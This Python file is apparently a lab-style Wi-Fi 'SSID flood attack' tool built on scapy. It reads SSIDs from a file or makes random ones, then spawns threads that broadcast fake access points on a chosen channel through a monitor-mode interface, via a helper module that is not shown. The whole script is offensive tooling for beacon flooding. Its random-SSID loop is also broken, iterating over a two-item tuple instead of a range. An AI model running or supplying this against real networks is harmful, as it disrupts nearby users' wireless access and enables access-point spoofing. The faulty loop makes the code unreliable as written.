import sys

from scapy import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, RadioTap, Dot11Elt, Dot11ProbeResp
from scapy.sendrecv import sniff, sendp
from scapy.utils import hexdump

import _thread
import random
import argparse
from fakeChannel import createNetwork
from fakeChannel import SCANNER
from fakeChannel import channel_hopper


def main():
    srcMacAddress = "22:22:22:22:22:22"
    apMacAddress = '33:33:33:33:33:33'

    characters = "123456789abcdefghijk"

    scanner = SCANNER()
        # Passing arguments
    parser = argparse.ArgumentParser(prog="SSID flood attack",
                                    usage="%(prog)s -i wlan0mon -c channel -f file",
                                    description="Scapy SSID flood",
                                    allow_abbrev=True)
    parser.add_argument("-i", "--Interface", required=True,
                        help="The interface that you want to send packets out of, needs to be set to monitor mode")
    parser.add_argument("-c", "--Channel", required=True,
                        help="The channel where the fake network are created")
    parser.add_argument("-f", "--File", required=False,
                        help="Path for the file with network fake ssid")
  
    args = parser.parse_args()


    ssidList = []
    scanner.interface = args.Interface
    if args.File != None:
        FILE = open(args.File, 'r')
        ssidList = FILE.readlines()
    else:
        nb = input("Number of AP to generate")
        l = list(characters)
        for i in (0, int(nb)):
            random.shuffle(l)
            ssidList.append(''.join(l))
    for ssid in ssidList:
        _thread.start_new_thread(createNetwork, (bytes(ssid, "utf-8"), scanner, int(args.Channel) ))
    while(True):
        pass
